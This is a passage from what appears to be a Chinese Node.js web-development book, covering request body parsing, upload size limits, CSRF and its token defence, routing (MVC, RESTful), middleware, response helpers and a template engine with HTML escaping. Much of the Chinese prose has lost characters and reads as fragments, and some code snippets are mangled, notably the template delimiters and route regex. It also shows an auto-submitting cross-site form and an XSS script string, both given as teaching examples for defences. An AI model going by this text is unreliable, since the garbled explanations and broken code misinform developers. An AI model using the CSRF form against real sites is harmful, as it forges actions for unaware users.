一我们是的，解它就分。的一是，由于是上，像、JSONXML样接收内解的不可接。接收大小的数量时，我们要分，下
function (req, res) { if (hasBody(req)) {  var done = function () { 
handle(req, res);  };  if (mime(req) === 'application/json') { 
parseJSON(req, done);  } else if (mime(req) === 'application/xml') { parseXML(req, done);  } else if (mime(req) === 'multipart/form-data') { parseMultipart(req, done); } } else {  handle(req, res); } } 
这我们req这个对接对应的解，由解自上的内，接收内并在内中，。这要到的是formidable。它于解，接收到的写入到系统的时中，并对应的，下
var formidable = require('formidable'); 
function (req, res) { if (hasBody(req)) { 
 if (mime(req) === 'multipart/form-data') { var form = new formidable.IncomingForm(); form.parse(req, function(err, fields, files) { 
req.body = fields; req.files = files; handle(req, res); 
}); } } else {  handle(req, res); } } 
因在务中只要req.bodyreq.files中的内可。
8.2.4
Node了相对的API，过它样的Web应用都是相对的，是在Web应用中，不不与数上相关的问题。由于Node与前端JavaScript的性，前端JavaScript甚至可以上到服务接，在这我们并不这样的动作，是内CSRF相关的问题。
1. 
在解、JSONXML部分，我们的是用的有数，后解，最后才务。这在在的问题是，它仅仅数量小的请，一数量过大，发生内的情。者过客端能分大量数，者次1 MB的内，只要并发请数量一大，内就会很。
要解决这个问题要有个。上内的大小，一过，接收数，并应400。过解，数到中，Node只小数。在上的上中已经有，这一下Connect中用的上数量的
，下
var bytes = 1024; 
function (req, res) { var received = 0, var len = req.headers['content-length'] ? parseInt(req.headers['content-length'], 10) : null; 
// 如内容过长限制回请求实体过长的状态码
if (len && len > bytes) {  res.writeHead(413);  res.end(); return; 
} // limit 
req.on('data', function (chunk) {  received += chunk.length; if (received > bytes) { 
//接收数据发end() req.destroy(); } }); 
handle(req, res); }; 
从上的中我们可以到，数是由包Content-Length的请是否过的，过接应413。对于没有Content-Length的请，一，在个data事中定可。一过，服务接收新的数。是JSONXML，极有可能解。对于上线的Web应用，加一个上大小分有于服务，在时，能定从应对。
2. CSRF 
CSRF的是Cross-SiteRequest Forgery，中为请。前了服务端与客端过Cookie识认用，言，用过问服务端的Session ID是的，是CSRF的者并不要Session ID就能用中招。
为了解CSRF是样一个过程，这以一个言的。个网有这样一个言程序，言的接下
http://domain_a.com/guestbook
用过POSTcontent就能言。服务端会自动从Session数中是的数，补usernameupdatedAt个后数中写入数，下
function (req, res) { var content = req.body.content || ''; var username = req.session.username; var feedback = { 
 username: username,  content: content,  updatedAt: Date.now() 
}; 
db.save(feedback, function (err) {  res.writeHead(200);  res.end('Ok'); 
}); } 
的情下，的言，就会在中的信。个者发了这的接在CSRF，他就可以在一个网（http://domain_b.com/attack）上了一个，下
<form id="test" method="POST" action="http://domain_a.com/guestbook"> <input type="hidden" name="content" value="vim是上的编辑器" /> 
</form> <script type="text/javascript"> $(function () {  $("#test").submit(); }); </script> 
这情下，者只要个domain_a的用问这个domain_b的网，就会自动一个言。由于在到domain_a的过程中，会domain_a的Cookie发到服务，管这个请是自domain_b的，是服务并不情，用也不情。
以上过程就是一个CSRF的过程。这的仅仅是一个言的，的是的接，程可想。管过Node接收数分，是问题还是不。好在CSRF并不可，解决CSRF的有加机的，下
var generateRandom = function(len) { 
return crypto.randomBytes(Math.ceil(len * 3 / 4))  .toString('base64')  .slice(0, len); 
}; 
也就是，为个请的用，在Session中一个机，下
var token = req.session._csrf || (req.session._csrf = generateRandom(24));
在做页的过程中，这个_csrf之前端，下
<form id="test" method="POST" action="http://domain_a.com/guestbook"> <input type="hidden" name="content" value="vim是上的编辑器" /> <input type="hidden" name="_csrf" value="< =_csrf >" /> 
%% 
</form> 
由于是一个机，者相的机的相大，以我们只要在接收端做一次就能识请是否为的，下
function (req, res) { var token = req.session._csrf || (req.session._csrf = generateRandom(24)); 
var _csrf = req.body._csrf; 
if (token !== _csrf) {  res.writeHead(403);  res.end("访问"); 
} else {  handle(req, res); } } 
_csrf也可以在于者请中。

## 8.3 路由解析

前了多 Web 请过程中的过程，对于不的务，我们还是有不的
，这了由的问题。本会、MVC、RESTful 由。
8.3.1

1.

这的由在解的部分有过，人服的在于 URL 的与网目的一，，。这由的也分，请对应的发客端可。这在前解部分有，不复。

2.

在 MVC 起之前，动脚本也是本的由，它的是 Web 服务 URL 到对应的，/index.asp/index.php。Web 服务后脚本的解，并入 HTTP 请的上下。
以下是 Apache 中 PHP 的
AddType application/x-httpd-php .php
解脚本，并应，到服务的目的。今大多数的服务都能很能
后时服务动。这在 Node 中不，要因是的后都是.js，分不是后端脚本，还是前端脚本，这可不是好的。且 Node 中 Web 服务与应用务脚本是一的，这实。
8.3.2MVC
在 MVC 之前，的都是过的，甚至以为是。到有一天开发者发用请的 URL 可以脚本在的没有关系。
MVC 的要想是务分，要分为以下几。
（Controller），一组为的。
（Model），数相关的作。
图（View），图的。这是目前最为经的分（图 8-3），大言，它的工作下。
由解，URL 到对应的为。
为用相关的，数作。
数作后，用图相关数页，到客端。

用页，实都大小，我们在后续中开，且过。URL 做由，这有个分实。一是过工关，一是自关。前者会有一个对应的由 URL 到对应的，后者没有这样的。

图 8-3 分

1.

工了要工由外为始外，它对 URL 的要分灵活，几没有上的。下的 URL 都能自由
/user/setting /setting/user
这已经有了一个用信的，下
exports.setting = function (req, res) { // TODO };
加一个的就，为了后续的，这个 use()，下
var routes = [];
var use = function (path, action) { routes.push([path, action]); };
我们在入程序中 URL，后对应的，于是就了本的由过程，下
function (req, res) { var pathname = url.parse(req.url).pathname; for (var i = 0; i < routes.length; i++) {
var route = routes[i];
if (pathname === route[0]) { var action = route[1]; action(req, res); return;
} } // 处理 404 请求 handle404(req, res);
}
工分，由于它对 URL 分灵活，以我们可以个都到相的务，下
use('/user/setting', exports.setting); use('/setting/user', exports.setting); //
use('/setting/user/jacksontian', exports.setting);
.
对于的，用上的可，是下的请就了
/profile/jacksontian /profile/hoover
这些请要不的用不的内，这只有个用，系统中在上个用，我们就不可能工有用的由请，因应生，我们-过以下的就可以到用
use('/profile/:username', function (req, res) { // TODO });
于是我们我们的，在过 use 由时要为一个，后过它，下
var pathRegexp = function(path) {
path = path .concat(strict ? '' : '/?') .replace(/\/\(/g, '(?:/') .replace(/(\/)?(\.)?:(\w+)(?:(\(.\*?\)))?(\?)?(\*)?/g, function(\_, slash, format, key, capture,
optional, star){ slash = slash || ''; return ''

- (optional ? '' : slash)
- '(?:'
- (optional ? slash : '')
- (format || '') + (capture || (format && '([^/.]+?)' || '([^/]+?)')) + ')'
- (optional || '')

- (star ? '(/_)?' : ''); }) .replace(/([\/.])/g, '\\\$1') .replace(/\*/g, '(._)');
  return new RegExp('^' + path + '\$'); }
  上分复杂，言，它能实下的
  /profile/:username => /profile/jacksontian, /profile/hoover /user.:ext => /user.xml, /user.json
  在我们新部分
  var use = function (path, action) { routes.push([pathRegexp(path), action]); };
  以部分
  function (req, res) { var pathname = url.parse(req.url).pathname; for (var i = 0; i < routes.length; i++) {
  route = routes[i]; // var 正则配 if (route[0].exec(pathname)) { var action = route[1]; action(req, res); return; } } // 处理 404 请求 handle404(req, res); }
  在我们的由能就能实了，为大量的用工由了。
  数
  管了，可以实相 URL 的，是:username 到了，还没有解决。为我们还要一到的内，在务中能下这样用
  use('/profile/:username', function (req, res) { var username = req.params.username; // TODO
  });
  这的目是的内到 req.params。一就是，下
  var pathRegexp = function(path) { var keys = [];
  path = path .concat(strict ? '' : '/?') .replace(/\/\(/g, '(?:/') .replace(/(\/)?(\.)?:(\w+)(?:(\(.\*?\)))?(\?)?(\*)?/g, function(\_, slash, format, key, capture,
  optional, star){ //将配的存 keys.push(key); slash = slash || ''; return ''
- (optional ? '' : slash)
- '(?:'
- (optional ? slash : '')
- (format || '') + (capture || (format && '([^/.]+?)' || '([^/]+?)')) + ')'
- (optional || '')

- (star ? '(/_)?' : ''); }) .replace(/([\/.])/g, '\\\$1') .replace(/\*/g, '(._)');
  return { keys: keys, regexp: new RegExp('^' + path + '\$')
  }; }
  我们的实的 URL 到到的实，并到 req.params，
  下
  function (req, res) { var pathname = url.parse(req.url).pathname; for (var i = 0; i < routes.length; i++) {
  route = routes[i]; // var 正则配 var reg = route[0].regexp; var keys = route[0].keys; var matched = reg.exec(pathname); if (matched) { //具体 var params = {}; for (var i = 0, l = keys.length; i < l; i++) { var value = matched[i + 1]; if (value) { params[keys[i]] = value; } } req.params = params;
  var action = route[1]; action(req, res); return;
  } } // 处理 404 请求 handle404(req, res);
  }
  至，我们了从（req.query）数（req.body）中到外，还能从的到。

2.

工的优在于可以很灵活，是目大，由的数量也会很多。从前端到的，要阅才能定到实的，为有人，是由不由。实上并没有由，是由一定的自实了由，由。
上的解部分对这自的实有，言，它下了分
/controller/action/param1/param2/param3
以/user/setting/12/1987 为，它会定 controllers 目下的 user，require 后，用这个的 setting()，余的作为数接这个。
function (req, res) { var pathname = url.parse(req.url).pathname; var paths = pathname.split('/'); var controller = paths[1] || 'index'; var action = paths[2] || 'index'; var args = paths.slice(3); var module;
try { // require 的缓存机制使有是阻塞的 module = require('./controllers/' + controller);
} catch (ex) { handle500(req, res); return;
} var method = module[action] if (method) {
method.apply(null, [req, res].concat(args)); } else { handle500(req, res); } }
由于这自的没有数的，以用 req.params 的，是
接过数，下
exports.setting = function (req, res, month, year) { // 如路径为/user/setting/12/1987 么 month 为 12year 为 1987 // TODO
}; 事实上工也能作为数，不是过 req.params。是这个，这不做。
自这由在 PHP 的 MVCCodeIgniter 中应用分广，分，在 Node 中实它也分。与工相，URL 动，它的也要发生动，工只要动由可。
8.3.3RESTful
MVC 大了很多年，到 RESTful 的，大才识到 URL 也可以很，请也能作为分发的。
REST 的是 RepresentationalState Transfer，中为。REST 的，我们为 RESTful。它的学要服务端的内实作一个源，并在 URL 上。
一个用的下
/users/jacksontian
这个了一个源，对这个源的作，要在 HTTP 请上，不是在 URL 上。过我们对用的是下这样 URL 的
POST /user/add?username=jacksontian GET /user/remove?username=jacksontian POST /user/update?username=jacksontian GET /user/get?username=jacksontian
作为要在为上，要使用的请是 POSTGET。在 RESTful 中，它是下这样的
POST /user/jacksontian DELETE /user/jacksontian PUT /user/jacksontian GET /user/jacksontian
它 DELETEPUT 请入中，与源的作源的。对于这个源的，也不过一样在 URL 的后上。过源的与后有很大的关，
GET /user/jacksontian.json GET /user/jacksontian.xml
在 RESTful 中，源的由请中的 Accept 服务端的情决定。客端时接 JSONXML 的应，它的 Accept 是下这样的
Accept: application/json,application/xml
的服务端应要这个，后自己能应的做应。在应中，过 Content-Type 客端是，下
Content-Type: application/json
，我们之为的。以 REST 的就是，过 URL 源、请定源的作，过 Accept 决定源的。RESTful 与 MVC 并不，且是好的。相 MVC，RESTful 只是 HTTP 请也加入了由的过程，以在 URL 上源。
.
为了 Node 能 RESTful，我们了我们的。use 是对有请的，在 RESTful 的场景下，我们要区分请。下
var routes = {'all': []}; var app = {}; app.use = function (path, action) {
routes.all.push([pathRegexp(path), action]); };
['get', 'put', 'delete', 'post'].forEach(function (method) { routes[method] = []; app[method] = function (path, action) {
routes[method].push([pathRegexp(path), action]); }; });
上的加了 get()、put()、delete()、post()4 个后，我们过下的由
//加用户 app.post('/user/:username', addUser); //用户 app.delete('/user/:username', removeUser); //用户
app.put('/user/:username', updateUser); //查询用户 app.get('/user/:username', getUser);
这样的由能识请，并务分发。为了分发部分，我们的部分为 match()，下
var match = function (pathname, routes) { for (var i = 0; i < routes.length; i++) { route = routes[i];
// var 正则配 var reg = route[0].regexp; var keys = route[0].keys; var matched = reg.exec(pathname); if (matched) {
//具体 var params = {}; for (var i = 0, l = keys.length; i < l; i++) {
var value = matched[i + 1]; if (value) { params[keys[i]] = value;
} } req.params = params;
var action = route[1]; action(req, res); return true;
} } return false;
};
后我们的分发部分，下
function (req, res) { var pathname = url.parse(req.url).pathname; // 将请求方法为小写 var method = req.method.toLowerCase(); if (routes.hasOwnPerperty(method)) {
//据请求方法分发 if (match(pathname, routes[method])) { return;
} else { //如路径有配成功试 all()处理 if (match(pathname, routes.all)) {
return; } }
} else { //接 all()处理 if (match(pathname, routes.all)) {
return; }
}
// 处理 404 请求
handle404(req, res);
}
，我们了实 RESTful 的要。这的实过程用了工的，事实上过自也能 RESTful 的，是 Controller/Action 的定要为 Resource/Method 的定，已经实，不。
目前 RESTful 应用已经开始广起，着务前端、客端的多样，RESTful 以量的，到广大开发者的。对于多数的应用言，只要一 RESTful 服务接，就能应动端、PC 端的客端应用。

## 8.4 中间件

接触 Web 应用的能由能后，我们发从应 Hello World 的到实的目，实有多的工作要，上内只是了要的部分。对于 Web 应用言，我们不用接触到这多性的，为我们入中（middleware）这些与务之的，开发者能关在务的开发上，以到开发的目的。
在最的中的定中，它是一在作系统上为应用服务的机。它不是作系统的一部分，也不是应用的一部分，它于作系统与应用之，应用好、使用服务。今中的了这，为上服务的，并定在作系统。这要到的中，就是为我们上的有 HTTP 请的中，开发者可以这部分，在务上。
中的为 Java 中过（filter）的工作，就是在入的务之前，过。它的工作图 8-4。
图 8-4，从 HTTP 请到务之，实有很多的要。Node 的 http 了应用网的，对务并没有，在务之下，有开发对务。这我们过中的开发，这个开发用组织个中。对于 Web 应用的能，我们过中，个中相对的，最强大的。
由于中就是前的些本能，以它的上下也就是请对应对 reqres。有一区的是，由于 Node 的因，我们要一机，在前中后，下一个中。在 4 中实已经对中做了，这我们还是用 Connect 的，过触发的实。一个本的中会是下的
var middleware = function (req, res, next) {
// TODO
next();
}

图 8-4 中的工作
的，我们为的务加中应是很的事情，过，能有的能起，下
app.use('/user/:username', querystring, cookie, session, function (req, res) { // TODO });
这的 querystring、cookie、session 中与前的能大小下
// querystring 解析中间件
var querystring = function (req, res, next) { req.query = url.parse(req.url, true).query; next();
}; // cookie 解析中间件 var cookie = function (req, res, next) {
var cookie = req.headers.cookie; var cookies = {}; if (cookie) {
var list = cookie.split(';');
for (var i = 0; i < list.length; i++) { var pair = list[i].split('='); cookies[pair[0].trim()] = pair[1];
} }
req.cookies = cookies; next(); };
可以到这的中都是分的，接下我们要组织起这些中。这我们由分开，中务都务，use()下
app.use = function (path) {
var handle = { //数作为路径 path: pathRegexp(path), //其他的是处理单元 stack: Array.prototype.slice.call(arguments, 1)
}; routes.all.push(handle); };
后的 use()中都了 stack 数组中，后触发。由于发生，我们的部分也要，下
var match = function (pathname, routes) {
for (var i = 0; i < routes.length; i++) { var route = routes[i]; //正则配 var reg = route.path.regexp; var matched = reg.exec(pathname); if (matched) {
//具体//代码//将中间件数组给 handle()方法处理 handle(req, res, route.stack); return true;
} } return false;
};
一，中动都了 handle()，后，性数组中的中，个中后，定用入 next()以触发下一个中（者接应），到最后的务。下
var handle = function (req, res, stack) {
var next = function () { //从 stack 数组中出中间件执行 var middleware = stack.shift(); if (middleware) {
//传入 next()函数自使中间件能执行结递 middleware(req, res, next); } };
// 启动执行 next(); };
这的问是，像 querystring、cookie、session 这样的能中是否要为个由都都会下的由
app.get('/user/:username', querystring, cookie, session, getUser); app.put('/user/:username', querystring, cookie, session, updateUser); //多路
为个由都中并不是一个好的，中务是的，我们是否可以由中是否可以人性能的，能的是 Yes，下
app.use(querystring); app.use(cookie); app.use(session); app.get('/user/:username', getUser); app.put('/user/:username', authorize, updateUser);
为了灵活的，这续我们的 use()以应数的，下
app.use = function (path) {
var handle;
if (typeof path === 'string') {
handle = {
//数作为路径
path: pathRegexp(path),
//其他的是处理单元
stack: Array.prototype.slice.call(arguments, 1)
};
} else {
handle = {
//数作为路径
path: pathRegexp('/'),
//其他的是处理单元
stack: Array.prototype.slice.call(arguments, 0)
};
}
routes.all.push(handle);
};
了 use()外，还要续我们的过程，与前一一次后就不后续不，还会继续后续，这我们有到中的都时起，下
var match = function (pathname, routes) {
var stacks = [];
for (var i = 0; i < routes.length; i++) {
route = routes[i];
// var 正则配
var reg = route.path.regexp;
var matched = reg.exec(pathname);
if (matched) {
//具体
//代码
//将中间件存
stacks = stacks.concat(route.stack);
}
}
return stacks;
};
use()后，还要续分发的过程
function (req, res) { var pathname = url.parse(req.url).pathname; // 将请求方法为小写 var method = req.method.toLowerCase(); // all()方法的中间件 var stacks = match(pathname, routes.all); if (routes.hasOwnPerperty(method)) {
//据请求方法分发关的中间件 stacks.concat(match(pathname, routes[method])); }
if (stacks.length) { handle(req, res, stacks);
} else { //处理 404 请求 handle404(req, res);
} }
上，过中由的作，我们不不之已经复杂的事情下，Web 应用开发者可以只关务开发就能个开发工作。
8.4.1
是，个中办我们要为自己的 Web 应用的定性性。于是我们为 next()加 err 数，并中接的，下
var handle = function (req, res, stack) { var next = function (err) { if (err) {
return handle500(err, req, res, stack); } //从 stack 数组中出中间件执行 var middleware = stack.shift(); if (middleware) {
//传入 next()函数自使中间件能执行结递 try { middleware(req, res, next); } catch (ex) { next(err); } } };
// 启动执行 next(); };
由于的不能接（在 4 中有过），中产生的要自己，下
var session = function (req, res, next) {
var id = req.cookies.sessionid; store.get(id, function (err, session) {
if (err) { //将异常通过 next()传递 return next(err);
} req.session = session; next();
}); };
Next()接到对后，会 handle500()。为了中的想续下，我们认为的中也是能数组的。由于要时，以用于
的中的与中有，它的数有 4 个，下
var middleware = function (err, req, res, next) { // TODO next();
};
我们过 use()可以有的中起，下
app.use(function (err, req, res, next) { // TODO });
为了区分中中，handle500()会对中数，后。
var handle500 = function (err, req, res, stack) { // 异常处理中间件 stack = stack.filter(function (middleware) {
return middleware.length === 4; });
var next = function () { //从 stack 数组中出中间件执行 var middleware = stack.shift(); 8 if (middleware) {
//传递异常对象 middleware(err, req, res, next); } };
// 启动执行 next(); };
8.4.2
前我们加了强大的中组织能，到一个的，就是我们的务是在最后才。为了务，应端用，中的编写使用是
要一的。下是个要的能的。编写高的中。
用由，不要的中。

1.

编写高的中实就是个的，以用 next()后续。要的事情是，一中，个请都会使中一次，它只 1 的时，都会我们的 QPS 下。的优有几。
使用高的。要时过 jsperf.com 测试性能。
要复的（要用量，因在 5 过）。
不要的。HTTP 的解，对于 GET 不要。

2.

在有一高的中后，并不着个中我们都使用，的由使不要的中不与请的过程。这以一个问题。我们这有一个的中，它会对请，上在对应，就应对应的，否就由下中，下
var staticFile = function (req, res, next) { var pathname = url.parse(req.url).pathname;
fs.readFile(path.join(ROOT, pathname), function (err, file) { if (err) {
return next(); } res.writeHead(200); res.end(file);
}); };
我们以下的由
app.use(staticFile);
着对/下的有 URL 请都会。由于它中到了 I/O，，它的还，是不，次的 I/O 都是对性能的，使 QPS 线下。对于这情，我们要做的是，就不能使用认的/了，因为它的高。它加一个好的由是个不的，下
app.use('/public', staticFile);
这样只有/public 会上，余本不会中。
8.4.3
中使前的能，从的发收很的组织。对于个中言，它，一。与像一样杂在一起的相，它好的可测试性。中机使 Web 应用好的可性可组性，可以数。从它就是 Unix 学的一个实，，小，后过组使用，发强大的能量。
中是 Connect 的经，过本的，我们已经可以到个 Connect 是的。本试图解 Web 开发过程的前，了多，管与实的 Connect 不相，着这些，开发者都能立写应自己务的。

## 8.5 页面渲染

过中机组织能我们的请后，不管是过 MVC 还是过 RESTful 由，开发者者是用了数，者是了作，者是了内，这时我们于到了应客端的部分了。这的页是个的题，我们实应的可能是一个 HTML 网页，也可能是 CSS、JS，者是他多。这我们要接上的 HTTP 应实的技术，要包内应页个部分。
对于过的 ASP、PHP、JSP 动网页技术，页是一内的能。对于 Node，它并没有这样的内能，在本的中，你会到是因为能的，我们可以，发多好的技术，社区的创使 Node 在 HTTP 应上加多的。
8.5.1
在 7 我们了 http 了对请应的作，在这我们开应用使用应的。服务端应的，最都要端。这个端可能是端，也可能是端，也可能是。服务端的应从一定程上决定了客端应的内。
内应的过程中，应中的 Content-\*分要。在下的应中，服务端客端内是以 gzip 编的，内为 21 170 个，内为 JavaScript，为 UTF-8
Content-Encoding: gzip Content-Length: 21170 Content-Type: text/javascript; charset=utf-8
客端在接收到这个后，的过程是过 gzip 解中的内，用内是否，后以 UTF-8 解后的脚本入到中。

1. MIME
   想要客端用的应内，了解 MIME 不可。可以想一下下在客端会有样的
   res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('<html><body>Hello World</body></html>\n'); //者
   res.writeHead(200, {'Content-Type': 'text/html'});
   res.end('<html><body>Hello World</body></html>\n');
   在网页中，前者的是<html><body>Hello World</body></html>，后者只能到 Hello World，图 8-5。

图 8-5 Content-Type 不使网页的内不
没，起上的因就在于它们的 Content-Type 的是不的。对内用了不的，前者为本，后者为 HTML，并了 DOM 树。是过不的 Content-Type 的决定用不的，这个我们为 MIME。
MIME 的是 Multipurpose Internet Mail Extensions，从可以，它最用于，后也应用到中。不的有不的 MIME，JSON 的为 application/json、XML 的为 application/xml、PDF 的为 application/pdf。
为了的 MIME，社区有有的 mime 可以用。它的用分，下
var mime = require('mime');
mime.lookup('/path/to/file.txt'); // => 'text/plain' mime.lookup('file.txt'); // => 'text/plain' mime.lookup('.TXT'); // => 'text/plain' mime.lookup('htm'); // => 'text/html'
了 MIME 外，Content-Type 的中还可以包一些数，。下
Content-Type: text/javascript; charset=utf-8

2.

在一些场景下，应的内是样的 MIME，中并不要客端开它，只并下它可。为了这，Content-Disposition 应场。Content-Disposition 的为是客端会它的是应数做时的内，还是可下的。内只时时，它的为 inline，数可以为时，它的为 attachment。外，Content-Disposition 还能过数定时应使用的。下
Content-Disposition: attachment; filename="filename.ext"
我们要一个应下的 API（res.sendfile），我们的大是下这样的
res.sendfile = function (filepath) { fs.stat(filepath, function(err, stat) { var stream = fs.createReadStream(filepath);
//设置内容 res.setHeader('Content-Type', mime.lookup(filepath)); //设置长 res.setHeader('Content-Length', stat.size); //设置为附件 res.setHeader('Content-Disposition' 'attachment; filename="' + path.basename(filepath) + '"'); res.writeHead(200); stream.pipe(res);
}); };

3. JSON
   为了应 JSON 数，我们也可以下这样
   res.json = function (json) { res.setHeader('Content-Type', 'application/json'); res.writeHead(200); res.end(JSON.stringify(json));
   };
4.

我们的 URL 因为些问题（）不能前请，要用到的 URL 时，我们也可以一个的实，下
res.redirect = function (url) { res.setHeader('Location', url); res.writeHead(302); res.end('Redirect to ' + url);
};
8.5.2
Web 应用的内应分，可以是内，也可以是他，也可以是。这我们到的的 HTML 内的应上，图。Web 应用最在上的内，都是过一系的图的。在动页技术中，最的图是由数生的。
是有的 HTML，过与数的，数到这些中，最后生的数的 HTML。我们为 render()，数就是数，下
res.render = function (view, data) { res.setHeader('Content-Type', 'text/html'); res.writeHead(200); // 实渲染 var html = render(view, data); res.end(html);
};
在 Node 中，数自是以 JSON 为，是有多可以使用了。上中的 render()我们可以是一个定接，接相数，最后 HTML。这样的我们都作实了这个接。
8.5.3
最的服务端动页开发，是在 CGI 程序 servlet 中 HTML，过网到客端，客端到用上。这与 HTML 的杂在一起的开发，一个小小的 UI 动都要大动，甚至要新编。为了这情，使 HTML 与分开，生一些服务端动网页技术，ASP、PHP、JSP。它们动语言部分过的（ASPJSP 以<%%>作为，PHP 以<? ?>作为）包起，过 HTML，开发者从 HTML 的工作中解。这样的一定程上了开发的，是页还是着大量的。这生了 MVC 在动网页技术中的发，MVC、、数分开的，大大高了目的可性。中技术就在这样的发中熟起的。
管技术起在 MVC 时才广使用，不可否认的是 ASP、PHP、JSP，它们实就是最的技术。技术多多样，它的实质就是数过生最的 HTML。技术的也就下 4 个要。
语言。
包语言的。有动数的数对。。对于 ASP、PHP、JSP 言，于服务端动页的内能，语言就是它们的
语言（VBScript、JScript、PHP、Java），就是以.php、.asp、.jsp 为后的，就是 Web。
这个时的极上下，甚至要个 HTTP 的请对。后语言的发使可以上下环境，只有数对就可以。PHP 中的 PHPLIB Template FastTemplate、Java 的 XSTL，以 Velocity、JDynamiTe、Tapestry。
这的在于它的实与语言有很大的关性，由于语言用的语言不，包，性。的一定编程语言就不会环境，以有开发者开发新的语言应不的编程语言。今系统多，能应用到多门编程语言中的这也开始。
者是 Mustache，它自己是的（logic-less templates），定了以{{}}为的一语言，并了多门编程语言的实，使用它作为很好的可性。着 Node 在社区的发，很开，语言可以创，也可以实。Node 社区目前与相关的不多要 3 个才能。并且由于 Node 与前端都用相的语言 JavaScript，以一语言也为它编写不的就能前后端用。
数与最相，这有一个、动的分过程，相的不的数可以到不的，不的与相的数也能到不的。技术使网页中的动内内不相，数开发者与开发者只要定好数，者就不用相了，图 8-6。

图 8-6 技术
技术并不是的技术，它的实上是接这样很的活，只是有着自的优技。是接并不为过，我们要的就是加数，过的就能到最的 HTML 这样。
我们的是下这样的，<=>
%%就是我们定的（这个要因为 ASP JSP 都用它做，相对熟悉）
Hello < =% username >
%
我们的数是{username: "JacksonTian"}，我们的就是 Hello JacksonTian。实的过程是分为 Hello<%= username %>个部分，前者为，后者是。要继续，与数关后为一个量，最与量最的。图 8-7 了与数的过程图。

图 8-7 与数的过程图

1.

为了的技术，我们过 render()实一个的。这个
会 Hello <%= username %>为"Hello " + obj.username。过程以下几个。
语分解。，这个过程用，<=>
%%的为/< =([\s\S]+?) >/g。
%%
。的语言。生的语。与数一起，生最。了程，数就可以开工了，下
var render = function (str, data) { // 模板是换的 var tpl = %%
str.replace(/< =([\s\S]+?) >/g, function(match, code) { return "' + obj." + code + "+ '"; });
tpl = "var tpl = '" + tpl + "'\nreturn tpl;"; var complied = new Function('obj', tpl); return complied(data);
};
用上的数试试，下
var tpl = 'Hello < =username >.';%
%
console.log(render(tpl, {username: 'Jackson Tian'})); // => Hello Jackson Tian.
.
上的实过程中，可以到有部分内前没有，它的内下
tpl = "var tpl = '" + tpl + "'\nreturn tpl;"; var complied = new Function('obj', tpl);
为了能最与数一起生，我们要始的一个数对。Hello < %=username >
%这，最会生下的
function (obj) { var tpl = 'Hello ' + obj.username + '.'; return tpl;
}
这个过程为编，生的中数只与相关，与的数关。
次都生这个中数，就会 CPU。为了的性能，我们会用
编的。是，上的可以解为个，下
var complie = function (str) { var tpl = %%
str.replace(/< =([\s\S]+?) >/g, functi on(match, code) { return "' + obj." + code + "+ '"; });
tpl = "var tpl = '" + tpl + "'\nreturn tpl;"; return new Function('obj, escape', tpl);
};
var render = function (complied, data) { return complied(data); };
过编编后的，实应用中就可以实一次编，多次，始的次过程中都要一次编。

2. with 上实的，只能量，< ="Jackson Tian" %>就了。为了它
   %
   灵活，我们要它的实，使能继续为，量能自动于它的对。于是 with 关入到我们的实中。with 关是 JavaScript 中 Douglas Crockford 的，在本书 C 中有。在这，with 关可以到很的应用。
   var complie = function (str, data) { // 模板是换的 var tpl = %%
   str.replace(/< =([\s\S]+?) >/g, function (match, code) { return "' + " + code + "+ '"; });
   tpl = "tpl = '" + tpl + "'"; tpl = 'var tpl = "";\nwith (obj) {' + tpl + '}\nreturn tpl;'; return new Function('obj', tpl);
   };
   就接，量 code 的是 obj[code]。关于 new Function()，这过它创了一个数对，它的语下
   new Function ([arg1[, arg2[, ... argN]],] functionBody)
   Function()数接多个数，最后一个数作为数的内，余数都会用作为新生的数的数。
   .
   前到过 XSS，它的产生大多相关，上中的 username 的为<script>alert("I am XSS.")</script>，的会是
   Hello <script>alert("I am XSS.")</script>.
   这会在页上这个脚本，好这的 username 是在 URL 的上入的，这就了 XSS。为了高性，大多数都了的能。就是能 HTML
   的的，这些要有&、<、>、"、'。数下
   var escape = function (html) {
   return String(html) .replace(/&(?!\w+;)/g, '&amp;') .replace(/</g, '&lt;') .replace(/>/g, '&gt;') .replace(/"/g, '&quot;') .replace(/'/g, '&#039;'); // IE 不支持&apos;单引转义
   };
   不定要 HTML 的最好都，为了，<=>
   %%
   <%->
   %分为的情，下
   var render = function (str, data) {
   var tpl = str.replace(/\n/g, '\\n') // 将换行符换
   .replace(/< =([% \s\S]+?) >/g, function (match, code) {
   %
   //转义 return "' + escape(" + code + ") + '"; }).replace(/<%-([\s\S]+?) >/g, function (match, code) {
   %
   //正常输出
   return "' + " + code + "+ '";
   });
   tpl = "tpl = '" + tpl + "'";
   tpl = 'var tpl = "";\nwith (obj) {' + tpl + '}\nreturn tpl;';
   // 加上 escape()函数
   return new Function('obj', 'escape', tpl);
   };
   过分-=并区对，最后不要入 escape()数。最上的会为的，下
   Hello &lt;script&gt;alert(&quot;I am XSS.&quot;)&lt;/script&gt;.
   因，在技术的使用中，时不要，是与入有关的量一定要。
3. 模
管技术已经务与图部分分开，是图上还是会在一些页的最。为了上强大一，我们为它加，使可以像 ASP、PHP 样页。下的，HTML 与入数相关
<% if (user) { >
% <h2>< = user.name %></h2>
% <% } else { >
%
<h2>名用户</h2> <% }>

%
它要编的数应是下这样的
function (obj, escape) {
var tpl = "";
with (obj) {
if (user) {
tpl += "<h2>" + escape(user.name) + "</h2>";
} else {
tpl += "<h2>名用户</h2>";
}
}
return tpl;
}
接的还是过，下
var complie = function (str) {
var tpl = str.replace(/\n/g, '\\n') // 将换行符换
.replace(/< =([% \s\S]+?) >/g, function (match, code) {
%
//转义
return "' + escape(" + code + ") + '"; }).replace(/< =([% \s\S]+?) >/g, function (match, code) {
%
//正常输出 return "' + " + code + "+ '"; }).replace(/< ([% \s\S]+?) >/g, function (match, code) {
%
//执行代码
return "';\n" + code + "\ntpl += '"; }).replace(/\'\n/g, '\'') .replace(/\n\'/gm, '\'');
tpl = "tpl = '" + tpl + "';"; // 转换空行 tpl = tpl.replace(/''/g, '\'\\n\''); tpl = 'var tpl = "";\nwith (obj || {}) {\n' + tpl + '\n}\nreturn tpl;'; return new Function('obj', 'escape', tpl);
};
上的实后，试试，下
var tpl = [ '< % if (user) { %>', '<h2>< =user.name ></h2>',
%% '< % } else { %>', '<h2>名用户</h2>', '< % } %>'].join(' \n');
render(complie(tpl), {user: {name: 'Jackson Tian'}});
到的内下

<h2>Jackson Tian</h2> 
接下在不user时试试，下
render(complie(tpl), {}); 
是到信，下
undefined:5  if (user) { ^ ReferenceError: user is not defined 
为了程序的性，要写一，对于不定是否在的性，应为它加上用，下
var tpl = [ '<% if (obj.user) { >',
%
